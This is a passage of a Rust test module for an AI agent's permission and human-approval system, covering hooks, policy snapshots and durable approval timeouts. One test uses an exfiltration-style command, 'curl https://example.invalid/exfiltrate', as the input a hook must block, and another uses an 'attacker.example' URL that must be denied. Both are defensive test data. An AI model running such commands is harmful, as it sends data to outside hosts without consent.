    }

    #[tokio::test]
    async fn approval_rewrite_cannot_bypass_the_enforcing_pre_tool_hook() {
        let approval_calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let hook_calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let mut hooks = HookDispatcher::new();
        let observed_hook_calls = hook_calls.clone();
        hooks.on_pre_tool_use(hooks::HookMatcher::tool("Bash"), move |_tool, input| {
            observed_hook_calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            if input["command"] == "curl https://example.invalid/exfiltrate" {
                HookOutcome::Block("network command denied".into())
            } else {
                HookOutcome::Continue
            }
        });
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            hooks,
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: Some(
                    json!({ "command": "curl https://example.invalid/exfiltrate" }),
                ),
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: approval_calls.clone(),
        }));

        let report = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git status" }),
            })
            .await;
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(report.pre_hook_outcome, "approval_recheck_block");
        assert_eq!(report.permission_source, "post_approval_pre_tool_hook");
        assert_eq!(approval_calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert_eq!(
            hook_calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "initial and approval-updated inputs must both pass the enforcing hook"
        );

        // The rejected reusable grant was never installed, so a later safe call asks again.
        let _ = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 2,
                tool_use_id: "call-2".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git diff" }),
            })
            .await;
        assert_eq!(approval_calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn exact_input_update_does_not_authorize_a_different_input() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowExactInput],
            },
            calls: calls.clone(),
        }));

        for (tool_use_id, command) in [
            ("call-1", "git status"),
            ("call-2", "git status"),
            ("call-3", "git diff"),
        ] {
            let report = g
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "run".into(),
                    turn: 1,
                    tool_use_id: tool_use_id.into(),
                    tool: "Bash".into(),
                    input: json!({ "command": command }),
                })
                .await;
            assert!(matches!(report.authorization, Authorization::Allowed(_)));
        }
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "only the identical input should reuse the first human approval"
        );
    }

    #[tokio::test]
    async fn deny_interrupt_is_preserved_in_authorization_and_report() {
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Deny {
                message: "human stopped the run".into(),
                interrupt: true,
            },
            calls: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
        }));
        let report = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git push" }),
            })
            .await;
        assert!(report.interrupt);
        assert!(report.authorization.interrupt());
        assert_eq!(report.permission_outcome, "ask_denied_interrupt");
        assert!(report.permission_source.contains("human_approval:ask-bash"));
    }

    #[tokio::test]
    async fn sealed_snapshot_is_enforced_and_frozen_per_invocation() {
        let allow = snapshot(PolicyEffect::Allow);
        let deny = snapshot(PolicyEffect::Deny);
        let configured = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(allow.clone());
        let invocation = configured.fork_for_run();
        let changed = configured.with_policy_snapshot(deny);

        assert!(matches!(
            invocation.authorize("network.fetch", &json!({})).await,
            Authorization::Allowed(_)
        ));
        assert!(matches!(
            changed.authorize("network.fetch", &json!({})).await,
            Authorization::Denied { .. }
        ));
        assert_eq!(invocation.policy_snapshot_hash(), Some(allow.hash()));

        let run = invocation
            .start_durable_run("session", "run", crate::durability::DurabilityMode::Sync)
            .unwrap();
        assert_eq!(run.policy_snapshot_hash(), Some(allow.hash()));
    }

    #[tokio::test]
    async fn high_level_authorization_applies_tenant_and_agent_policy_scopes() {
        let policy = PolicySnapshot::seal(PolicyDocument {
            schema_version: GOVERNANCE_CONTRACT_VERSION,
            default_effect: PolicyEffect::Allow,
            rules: vec![
                ScopedPolicyRule {
                    id: "deny-tenant".into(),
                    scope: PolicyScope::Tenant {
                        tenant_id: "tenant-a".into(),
                    },
                    effect: PolicyEffect::Deny,
                    reason: None,
                },
                ScopedPolicyRule {
                    id: "allow-agent".into(),
                    scope: PolicyScope::Agent {
                        agent_id: "agent-a".into(),
                    },
                    effect: PolicyEffect::Allow,
                    reason: None,
                },
            ],
        })
        .unwrap();
        let governance = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy)
            .with_policy_identity(Some("tenant-a".into()), Some("agent-a".into()));
        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run-a".into(),
                turn: 1,
                tool_use_id: "call-a".into(),
                tool: "filesystem.read".into(),
                input: json!({"path": "report.txt"}),
            })
            .await;
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert!(report.permission_source.contains("deny-tenant"));
    }

    struct DelayedApprover {
        delay: Duration,
        decision: ApprovalDecision,
    }

    #[async_trait]
    impl ToolApprover for DelayedApprover {
        async fn approve(&self, _request: ApprovalRequest) -> ApprovalDecision {
            tokio::time::sleep(self.delay).await;
            self.decision.clone()
        }
    }

    #[tokio::test]
    async fn legacy_approver_is_recorded_as_a_durable_approval() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let run = Arc::new(Mutex::new(
            base.start_durable_run("session", "durable-run", crate::DurabilityMode::Sync)
                .unwrap(),
        ));
        let governance = base
            .with_durable_approver(
                Arc::new(DelayedApprover {
                    delay: Duration::ZERO,
                    decision: ApprovalDecision::allow(None),
                }),
                run.clone(),
                Duration::from_secs(1),
            )
            .unwrap();

        assert!(matches!(
            governance
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "durable-run".into(),
                    turn: 1,
                    tool_use_id: "call-1".into(),
                    tool: "network.fetch".into(),
                    input: json!({"url": "https://example.com"}),
                })
                .await
                .authorization,
            Authorization::Allowed(_)
        ));
        let run = run.lock().unwrap();
        let approval = run.projection().approvals.values().next().unwrap();
        assert_eq!(approval.status, crate::DurableApprovalStatus::Approved);
        assert_eq!(
            approval.kind,
            crate::durability::DurableApprovalKind::Confirmation
        );
        assert_eq!(
            approval.governance_binding.as_ref(),
            run.governance_binding()
        );
        assert_eq!(
            approval.governance_binding.as_ref().unwrap().run_id(),
            "durable-run"
        );
        assert_eq!(run.status(), crate::durability::DurableRunStatus::Running);
        assert_eq!(
            crate::durability::RunState::from_events(run.events().to_vec()).unwrap(),
            *run
        );
    }

    #[tokio::test]
    async fn durable_binding_rejects_policy_identity_and_run_bypasses() {
        let ask = snapshot(PolicyEffect::Ask);
        let allow = snapshot(PolicyEffect::Allow);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(ask)
            .with_policy_identity(Some("tenant-a".into()), Some("agent-a".into()));
        let run = Arc::new(Mutex::new(
            base.start_durable_run("session", "bound-run", crate::DurabilityMode::Sync)
                .unwrap(),
        ));
        let pre_attachment_drift = base
            .clone()
            .with_policy_identity(Some("tenant-b".into()), Some("agent-a".into()))
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "bound-run".into(),
                turn: 1,
                tool_use_id: "pre-attachment".into(),
                tool: "network.fetch".into(),
                input: json!({}),
            })
            .await;
        assert!(pre_attachment_drift.interrupt);
        assert_eq!(pre_attachment_drift.permission_outcome, "binding_mismatch");
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let bound = base
            .clone()
            .with_durable_approver(
                Arc::new(FixedApprover {
                    decision: ApprovalDecision::allow(None),
                    calls: calls.clone(),
                }),
                run.clone(),
                Duration::from_secs(1),
            )
            .unwrap();
        let context = |run_id: &str| AuthorizationContext {
            run_id: run_id.into(),
            turn: 1,
            tool_use_id: "binding-call".into(),
            tool: "network.fetch".into(),
            input: json!({"url": "https://example.com"}),
        };

        for governance in [
            bound.clone().with_policy_snapshot(allow),
            bound
                .clone()
                .with_policy_identity(Some("tenant-b".into()), Some("agent-a".into())),
        ] {
            let report = governance
                .authorize_detailed_with_context(context("bound-run"))
                .await;
            assert!(report.interrupt);
            assert_eq!(report.permission_outcome, "binding_mismatch");
        }
        let wrong_run = bound
            .authorize_detailed_with_context(context("different-run"))
            .await;
        assert!(wrong_run.interrupt);
        assert_eq!(wrong_run.permission_outcome, "binding_mismatch");
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 0);

        let replayed = Arc::new(Mutex::new(
            crate::durability::RunState::from_events(run.lock().unwrap().events().to_vec())
                .unwrap(),
        ));
        let drifted_identity =
            base.with_policy_identity(Some("tenant-b".into()), Some("agent-a".into()));
        assert!(matches!(
            drifted_identity.with_durable_approver(
                Arc::new(DelayedApprover {
                    delay: Duration::ZERO,
                    decision: ApprovalDecision::allow(None),
                }),
                replayed,
                Duration::from_secs(1),
            ),
            Err(DurableApproverError::BindingMismatch(_))
        ));
    }

    #[tokio::test]
    async fn durable_approver_timeout_is_a_replayable_deny() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let run = Arc::new(Mutex::new(
            base.start_durable_run("session", "timeout-run", crate::DurabilityMode::Sync)
                .unwrap(),
        ));
        let governance = base
            .with_durable_approver(
                Arc::new(DelayedApprover {
                    delay: Duration::from_millis(50),
                    decision: ApprovalDecision::allow(None),
                }),
                run.clone(),
                Duration::from_millis(5),
            )
            .unwrap();

        let decision = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "timeout-run".into(),
                turn: 1,
                tool_use_id: "call-timeout".into(),
                tool: "network.fetch".into(),
                input: json!({}),
            })
            .await;
        assert!(matches!(
            decision.authorization,
            Authorization::Denied { .. }
        ));
        let run = run.lock().unwrap();
        let approval = run.projection().approvals.values().next().unwrap();
        assert_eq!(approval.status, crate::DurableApprovalStatus::Rejected);
        assert!(approval.timed_out);
        assert_eq!(
            crate::durability::RunState::from_events(run.events().to_vec()).unwrap(),
            *run
        );
    }

    #[tokio::test]
    async fn restart_replays_only_the_exact_durable_approval_without_reprompting() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let original_run = Arc::new(Mutex::new(
            base.start_durable_run("session", "restart-run", crate::DurabilityMode::Sync)
                .unwrap(),
        ));
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let callback = Arc::new(FixedApprover {
            decision: ApprovalDecision::allow(None),
            calls: calls.clone(),
        });
        let first = base
            .clone()
            .with_durable_approver(
                callback.clone(),
                original_run.clone(),
                Duration::from_secs(1),
            )
            .unwrap();
        let context = |input| AuthorizationContext {
            run_id: "restart-run".into(),
            turn: 1,
            tool_use_id: "stable-call".into(),
            tool: "network.fetch".into(),
            input,
        };
        assert!(matches!(
            first
                .authorize_detailed_with_context(context(json!({"url": "https://example.com"})))
                .await
                .authorization,
            Authorization::Allowed(_)
        ));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

        let restarted_state = {
            let run = original_run.lock().unwrap();
            crate::durability::RunState::from_events(run.events().to_vec()).unwrap()
        };
        let restarted_run = Arc::new(Mutex::new(restarted_state));
        let restarted = base
            .with_durable_approver(callback, restarted_run, Duration::from_secs(1))
            .unwrap();
        assert!(matches!(
            restarted
                .authorize_detailed_with_context(context(json!({"url": "https://example.com"})))
                .await
                .authorization,
            Authorization::Allowed(_)
        ));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

        let mismatch = restarted
            .authorize_detailed_with_context(context(json!({"url": "https://attacker.example"})))
            .await;
        assert!(mismatch.interrupt);
        assert!(matches!(
            mismatch.authorization,
            Authorization::Denied { .. }
        ));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    #[test]
    fn persisted_adapter_rejects_a_store_without_a_trusted_clock() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run(
                "session",
                "clockless-persisted-run",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let run = Arc::new(Mutex::new(initial.clone()));
        let store = Arc::new(ClocklessDurableStore::default());
        store.create(&initial).unwrap();
        let callback_calls = Arc::new(AtomicUsize::new(0));

        let result = base.with_persisted_durable_approver(
            Arc::new(FixedApprover {
                decision: ApprovalDecision::allow(None),
                calls: callback_calls.clone(),
            }),
            run.clone(),
            Duration::from_secs(1),
            store.clone(),
        );

        assert!(matches!(
            result,
            Err(DurableApproverError::Store(ref message))
                if message.contains("trusted approval clock is unavailable")
                    && message.contains("does not provide a trusted worker lease clock")
        ));
        assert_eq!(callback_calls.load(Ordering::SeqCst), 0);
        assert_eq!(*run.lock().unwrap(), initial);
        assert_eq!(store.load("clockless-persisted-run").unwrap(), initial);
    }

    #[test]
    fn persisted_adapter_rejects_a_store_without_atomic_resolution_capability() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run(
                "session",
                "non-atomic-persisted-run",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let run = Arc::new(Mutex::new(initial.clone()));
        let store = Arc::new(ClockOnlyDurableStore::default());
        store.create(&initial).unwrap();
        let callback_calls = Arc::new(AtomicUsize::new(0));

        let result = base.with_persisted_durable_approver(
            Arc::new(FixedApprover {
                decision: ApprovalDecision::allow(None),
                calls: callback_calls.clone(),
            }),
            run.clone(),
            Duration::from_secs(1),
            store.clone(),
        );

        assert!(matches!(
            result,
            Err(DurableApproverError::Store(ref message))
                if message.contains("does not provide atomic approval resolution")
        ));
        assert_eq!(callback_calls.load(Ordering::SeqCst), 0);
        assert_eq!(*run.lock().unwrap(), initial);
        assert_eq!(store.load("non-atomic-persisted-run").unwrap(), initial);
    }

    #[tokio::test]
    async fn persisted_adapter_commits_request_and_resolution_through_store_cas() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run("session", "stored-run", crate::DurabilityMode::Sync)
            .unwrap();
        let run = Arc::new(Mutex::new(initial.clone()));
        let store = Arc::new(InMemoryDurableStore::default());
        store.create(&initial).unwrap();
        let governance = base
            .with_persisted_durable_approver(
                Arc::new(DelayedApprover {
                    delay: Duration::ZERO,
                    decision: ApprovalDecision::allow(None),
                }),
                run.clone(),
                Duration::from_secs(1),
                store.clone(),
            )
            .unwrap();

        assert!(matches!(
            governance
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "stored-run".into(),
                    turn: 1,
                    tool_use_id: "stored-call".into(),
                    tool: "network.fetch".into(),
                    input: json!({"url": "https://example.com"}),
                })
                .await
                .authorization,
            Authorization::Allowed(_)
        ));
        let in_memory = run.lock().unwrap().clone();
        let persisted = store.load("stored-run").unwrap();
        assert_eq!(persisted, in_memory);
        assert_eq!(
            persisted
                .projection()
                .approvals
                .values()
                .next()
                .unwrap()
                .status,
            crate::DurableApprovalStatus::Approved
        );
    }

    #[tokio::test]
    async fn persisted_adapter_store_conflict_fails_closed_without_local_drift() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run("session", "conflict-run", crate::DurabilityMode::Sync)
            .unwrap();
        let run = Arc::new(Mutex::new(initial.clone()));
        let store = Arc::new(InMemoryDurableStore::default());
        store.create(&initial).unwrap();
        let governance = base
            .with_persisted_durable_approver(
                Arc::new(DelayedApprover {
                    delay: Duration::ZERO,
                    decision: ApprovalDecision::allow(None),
                }),
                run.clone(),
                Duration::from_secs(1),
                store.clone(),
            )
            .unwrap();

        let mut competing = initial.clone();
        competing
            .replace_state("other-worker", json!({"revision": 2}))
            .unwrap();
        let expected = initial.events().last().unwrap().sequence;
        store.compare_and_swap(expected, &competing).unwrap();

        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "conflict-run".into(),
                turn: 1,
                tool_use_id: "conflicting-call".into(),
                tool: "network.fetch".into(),
                input: json!({}),
            })
            .await;
        assert!(report.interrupt);
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(*run.lock().unwrap(), initial);
        assert_eq!(store.load("conflict-run").unwrap(), competing);
    }

    #[tokio::test]
    async fn driver_accepts_only_approver_with_the_same_poison_authority() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let state = base
            .start_durable_run(
                "session",
                "driver-approver-run",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let store = Arc::new(InMemoryDurableStore::default());
        let driver = crate::DurableRunDriver::new(state, store.clone()).unwrap();
        let callback = || {
            Arc::new(DelayedApprover {
                delay: Duration::ZERO,
                decision: ApprovalDecision::allow(None),
            }) as Arc<dyn ToolApprover>
        };

        assert!(matches!(
            base.clone()
                .with_approver(callback())
                .with_durable_driver(&driver),
            Err(DurableApproverError::BindingMismatch(_))
        ));

        let separately_persisted = base
            .clone()
            .with_persisted_durable_approver(
                callback(),
                driver.state_handle(),
                Duration::from_secs(1),
                driver.store_handle(),
            )
            .unwrap();
        assert!(matches!(
            separately_persisted.with_durable_driver(&driver),
            Err(DurableApproverError::BindingMismatch(_))
        ));

        let governance = base
            .with_persisted_durable_driver_approver(callback(), &driver, Duration::from_secs(1))
            .unwrap();
        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "driver-approver-run".into(),
                turn: 1,
                tool_use_id: "driver-call".into(),
                tool: "network.fetch".into(),
                input: json!({"url": "https://example.com"}),
            })
            .await;
        assert!(matches!(report.authorization, Authorization::Allowed(_)));
        assert_eq!(
            driver.snapshot().unwrap(),
            store.load("driver-approver-run").unwrap()
        );

        let mut competing = store.load("driver-approver-run").unwrap();
        let expected_sequence = competing.events().last().unwrap().sequence;
        competing
            .replace_state("other-worker", json!({"revision": 2}))
            .unwrap();
        store
            .compare_and_swap(expected_sequence, &competing)
            .unwrap();
        let stale_report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "driver-approver-run".into(),
                turn: 1,
                tool_use_id: "stale-driver-call".into(),
                tool: "network.fetch".into(),
                input: json!({"url": "https://other.example.com"}),
            })
            .await;
        assert!(stale_report.interrupt);
        assert!(matches!(
            stale_report.authorization,
            Authorization::Denied { .. }
        ));
        assert!(driver.is_poisoned());
    }

    #[tokio::test]
    async fn skewed_failover_rejects_allow_after_the_store_deadline() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy.clone());
        let mut state = base
            .start_durable_run(
                "session",
                "skewed-failover-approval",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let binding = state.governance_binding().unwrap().clone();
        let store_clock = unix_time_ms().unwrap().saturating_add(60_000);
        let approval_id = state
            .request_typed_approval(crate::durability::DurableApprovalRequest {
                logical_key: "late-call".into(),
                activity_id: None,
                kind: crate::durability::DurableApprovalKind::Confirmation,
                prompt: "Allow tool `network.fetch`?".into(),
                payload: json!({
                    "turn": 1,
                    "tool_use_id": "late-call",
                    "tool": "network.fetch",
                    "input": {"url": "https://example.com"},
                }),
                policy_snapshot_hash: Some(policy.hash().into()),
                governance_binding: Some(binding),
                requested_at_unix_ms: store_clock,
                expires_at_unix_ms: store_clock + 50,
            })
            .unwrap();
        let store = Arc::new(ManualClockDurableStore::new(state, store_clock));

        let crashed = crate::DurableRunDriver::new(
            store.load("skewed-failover-approval").unwrap(),
            store.clone(),
        )
        .unwrap();
        crashed
            .claim_worker_lease("worker-a", "lease-a", store_clock, store_clock + 25)
            .unwrap();
        drop(crashed);

        let recovered_at = store_clock + 100;
        store.set_clock(recovered_at);
        let recovered = crate::DurableRunDriver::new(
            store.load("skewed-failover-approval").unwrap(),
            store.clone(),
        )
        .unwrap();
        assert!(recovered
            .claim_worker_lease("worker-b", "lease-b", recovered_at, recovered_at + 10_000,)
            .unwrap());
        let recovered = recovered.bind_worker_lease("worker-b", "lease-b").unwrap();

        struct CountingAllowApprover(Arc<AtomicUsize>);

        #[async_trait]
        impl ToolApprover for CountingAllowApprover {
            async fn approve(&self, _request: ApprovalRequest) -> ApprovalDecision {
                self.0.fetch_add(1, Ordering::SeqCst);
                ApprovalDecision::allow(None)
            }
        }

        let callback_calls = Arc::new(AtomicUsize::new(0));
        let governance = base
            .with_persisted_durable_driver_approver(
                Arc::new(CountingAllowApprover(callback_calls.clone())),
                &recovered,
                Duration::from_secs(1),
            )
            .unwrap();
        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "skewed-failover-approval".into(),
                turn: 1,
                tool_use_id: "late-call".into(),
                tool: "network.fetch".into(),
                input: json!({"url": "https://example.com"}),
            })
            .await;

        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(callback_calls.load(Ordering::SeqCst), 0);
        assert!(!recovered.is_poisoned());
        let snapshot = recovered.snapshot().unwrap();
        let approval = &snapshot.projection().approvals[&approval_id];
        assert_eq!(
            approval.status,
            crate::durability::DurableApprovalStatus::Rejected
        );
        assert!(approval.timed_out);
        assert_eq!(snapshot, store.load("skewed-failover-approval").unwrap());

        store.set_clock(recovered_at + 1);
        recovered.release_worker_lease(recovered_at + 1).unwrap();
        assert!(store
            .load("skewed-failover-approval")
            .unwrap()
            .worker_lease()
            .is_none());
    }

    #[tokio::test]
    async fn clock_advance_inside_resolution_cas_rejects_late_allow() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run(
                "session",
                "atomic-approval-deadline",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let store_clock = 1_000_000;
        let store = Arc::new(ManualClockDurableStore::new(initial, store_clock));
        let driver = crate::DurableRunDriver::new(
            store.load("atomic-approval-deadline").unwrap(),
            store.clone(),
        )
        .unwrap();
        assert!(!driver
            .claim_worker_lease("worker-a", "lease-a", store_clock, store_clock + 10_000,)
            .unwrap());
        let driver = driver.bind_worker_lease("worker-a", "lease-a").unwrap();
        let callback_calls = Arc::new(AtomicUsize::new(0));
        let governance = base
            .with_persisted_durable_driver_approver(
                Arc::new(FixedApprover {
                    decision: ApprovalDecision::allow(None),
                    calls: callback_calls.clone(),
                }),
                &driver,
                Duration::from_millis(50),
            )
            .unwrap();

        // The request and post-callback timestamp reads both observe the pre-deadline value. The
        // backend clock advances only after the resolution CAS owns its lock, reproducing the
        // otherwise tiny read-then-CAS race deterministically.
        store.advance_clock_inside_next_approval_resolution_cas(store_clock + 51);
        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "atomic-approval-deadline".into(),
                turn: 1,
                tool_use_id: "atomic-late-call".into(),
                tool: "network.fetch".into(),
                input: json!({"url": "https://example.com"}),
            })
            .await;

        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(callback_calls.load(Ordering::SeqCst), 1);
        assert!(!driver.is_poisoned());
        let local = driver.snapshot().unwrap();
        let persisted = store.load("atomic-approval-deadline").unwrap();
        assert_eq!(local, persisted);
        let approval = persisted.projection().approvals.values().next().unwrap();
        assert_eq!(
            approval.status,
            crate::durability::DurableApprovalStatus::Rejected
        );
        assert!(approval.timed_out);
        assert_eq!(
            persisted
                .events()
                .iter()
                .filter(|event| matches!(event.kind, crate::RunEventKind::ApprovalResolved { .. }))
                .count(),
            1
        );
        driver.release_worker_lease(store_clock + 52).unwrap();
        assert!(!driver.is_poisoned());
        assert!(store
            .load("atomic-approval-deadline")
            .unwrap()
            .worker_lease()
            .is_none());
    }

    #[tokio::test]
    async fn failed_timeout_retry_poisons_the_leased_driver() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run(
                "session",
                "atomic-timeout-retry-failure",
                crate::DurabilityMode::Sync,
            )
            .unwrap();
        let store_clock = 2_000_000;
        let store = Arc::new(ManualClockDurableStore::new(initial, store_clock));
        let driver = crate::DurableRunDriver::new(
            store.load("atomic-timeout-retry-failure").unwrap(),
            store.clone(),
        )
        .unwrap();
        assert!(!driver
            .claim_worker_lease("worker-a", "lease-a", store_clock, store_clock + 10_000,)
            .unwrap());
        let driver = driver.bind_worker_lease("worker-a", "lease-a").unwrap();
        let callback_calls = Arc::new(AtomicUsize::new(0));
        let governance = base
            .with_persisted_durable_driver_approver(
                Arc::new(FixedApprover {
                    decision: ApprovalDecision::allow(None),
                    calls: callback_calls.clone(),
                }),
                &driver,
                Duration::from_millis(50),
            )
            .unwrap();

        store.advance_clock_inside_next_approval_resolution_cas(store_clock + 51);
        store.reject_next_timeout_resolution_as_expired();
        let report = governance
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "atomic-timeout-retry-failure".into(),
                turn: 1,
                tool_use_id: "retry-failure-call".into(),
                tool: "network.fetch".into(),
                input: json!({"url": "https://example.com"}),
            })
            .await;

        assert!(report.interrupt);
        assert!(matches!(report.authorization, Authorization::Denied { .. }));
        assert_eq!(callback_calls.load(Ordering::SeqCst), 1);
        assert!(driver.is_poisoned());
        let persisted = store.load("atomic-timeout-retry-failure").unwrap();
        assert_eq!(
            persisted
                .projection()
                .approvals
                .values()
                .next()
                .unwrap()
                .status,
            crate::durability::DurableApprovalStatus::Pending
        );
        assert!(matches!(
            driver.release_worker_lease(store_clock + 52),
            Err(crate::DurableRunDriverError::Poisoned)
        ));
        assert!(store
            .load("atomic-timeout-retry-failure")
            .unwrap()
            .worker_lease()
            .is_some());
    }

    #[tokio::test]
    async fn denial_after_deadline_matches_the_durable_timeout_replay() {
        let policy = snapshot(PolicyEffect::Ask);
        let base = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(policy);
        let initial = base
            .start_durable_run("session", "late-denial-replay", crate::DurabilityMode::Sync)
            .unwrap();
        let run = Arc::new(Mutex::new(initial.clone()));
        let store_clock = 3_000_000;
        let store = Arc::new(ManualClockDurableStore::new(initial, store_clock));
        let callback_calls = Arc::new(AtomicUsize::new(0));

        struct AdvanceThenDeny {
            store: Arc<ManualClockDurableStore>,
            now_unix_ms: u64,
            calls: Arc<AtomicUsize>,
        }

        #[async_trait]
        impl ToolApprover for AdvanceThenDeny {
            async fn approve(&self, _request: ApprovalRequest) -> ApprovalDecision {
                self.calls.fetch_add(1, Ordering::SeqCst);
                self.store.set_clock(self.now_unix_ms);
                ApprovalDecision::Deny {
                    message: "operator denied".into(),
                    interrupt: true,
                }
            }
        }

        let governance = base
            .clone()
            .with_persisted_durable_approver(
                Arc::new(AdvanceThenDeny {
                    store: store.clone(),
                    now_unix_ms: store_clock + 51,
                    calls: callback_calls.clone(),
                }),
                run.clone(),
                Duration::from_millis(50),
                store.clone(),
            )
            .unwrap();
        let context = || AuthorizationContext {
            run_id: "late-denial-replay".into(),
            turn: 1,
            tool_use_id: "late-denial-call".into(),
            tool: "network.fetch".into(),
            input: json!({"url": "https://example.com"}),
        };
        let first = governance.authorize_detailed_with_context(context()).await;
        assert_eq!(
            first.authorization,
            Authorization::Denied {
                message: "approval timed out".into(),
                interrupt: false,
            }
        );
        let approval = run
            .lock()
            .unwrap()
            .projection()
            .approvals
            .values()
            .next()
            .unwrap()
            .clone();
        assert!(approval.timed_out);

        let replay = base
            .with_persisted_durable_approver(
                Arc::new(FixedApprover {
                    decision: ApprovalDecision::allow(None),
                    calls: callback_calls.clone(),
                }),
                run,
                Duration::from_millis(50),
                store,
            )
            .unwrap()
            .authorize_detailed_with_context(context())
            .await;
        assert_eq!(replay.authorization, first.authorization);
        assert_eq!(replay.interrupt, first.interrupt);
        assert_eq!(callback_calls.load(Ordering::SeqCst), 1);
    }

    #[test]
    fn durable_binding_retirement_rejects_every_resumable_run_state() {
        let governance = Governance::new(PermissionEngine::default(), HookDispatcher::new())
            .with_policy_snapshot(snapshot(PolicyEffect::Allow));

        let running = governance
            .start_durable_run("session", "running-run", crate::DurabilityMode::Sync)
            .unwrap();
        assert!(matches!(
            governance.retire_durable_run(&running),
            Err(DurableApproverError::RunNotTerminal {
                status: crate::DurableRunStatus::Running,
                ..
            })
        ));

        let mut paused = governance
            .start_durable_run("session", "paused-run", crate::DurabilityMode::Sync)
            .unwrap();
        paused.pause("operator-pause", "awaiting operator").unwrap();
        assert!(matches!(
            governance.retire_durable_run(&paused),
            Err(DurableApproverError::RunNotTerminal {
                status: crate::DurableRunStatus::Paused,
